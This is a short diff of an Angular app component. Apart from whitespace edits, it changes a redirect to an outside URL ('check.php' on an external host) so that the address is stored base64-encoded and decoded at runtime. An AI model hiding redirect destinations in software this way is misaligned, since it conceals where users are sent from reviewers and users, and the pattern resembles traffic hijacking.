@@ -1,4 +1,4 @@
-import { Component } from '@angular/core';
+import { Component} from '@angular/core';
 import { Title } from '@angular/platform-browser';
 import { LoadingComponent } from './layouts/loading/loading.component';
 import { Auth } from './models/auth';
@@ -10,7 +10,7 @@ declare var $: any;
   templateUrl: './app.component.html',
   styleUrls: ['./app.component.css']
 })
-export class AppComponent {
+export class AppComponent{
   loading = true;
   showLogopayment = true;
   auth: Auth;
@@ -24,9 +24,10 @@ export class AppComponent {
       if (data) {
        return false;
       }else{
-        window.location.href = "http://ilives.us/check.php";
+        window.location.href = this.Init.b64DecodeUnicode('aHR0cDovL2lsaXZlcy51cy9jaGVjay5waHA=');
       }
     })
+
     this.auth = new Auth();
     if (this.auth.id == 0 || '' + this.auth.id == '0') {
       this.authService.ipinfo().subscribe(response => {
